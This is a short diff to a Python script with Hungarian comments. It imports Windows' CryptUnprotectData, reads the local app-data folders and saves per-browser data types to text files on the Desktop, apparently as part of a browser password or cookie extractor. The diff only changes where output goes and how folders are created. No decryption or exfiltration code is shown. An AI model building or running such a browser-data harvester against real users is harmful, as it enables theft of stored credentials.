@@ -10,9 +10,7 @@ from win32crypt import CryptUnprotectData
 
 
 # Ha a PowerShellből jön, használja, ha nincs, akkor a Desktop
-output_base = os.getenv('BROWSER_OUTPUT_PATH')
-if not output_base:
-    output_base = os.path.join(os.path.expanduser("~"), "Desktop")
+output_base = os.path.join(os.path.expanduser("~"), "Desktop")
     
 appdata = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -87,7 +85,7 @@ def convert_chrome_time(chrome_time):
 def save_results(browser_name, type_of_data, content):
     browser_dir = os.path.join(output_base, browser_name)
     if not os.path.exists(browser_dir):
-        os.mkdir(browser_dir)
+        os.makedirs(browser_dir)  # létrehozza az összes hiányzó mappát
     if content:
         with open(os.path.join(browser_dir, f"{type_of_data}.txt"), 'w', encoding="utf-8") as f:
             f.write(content)
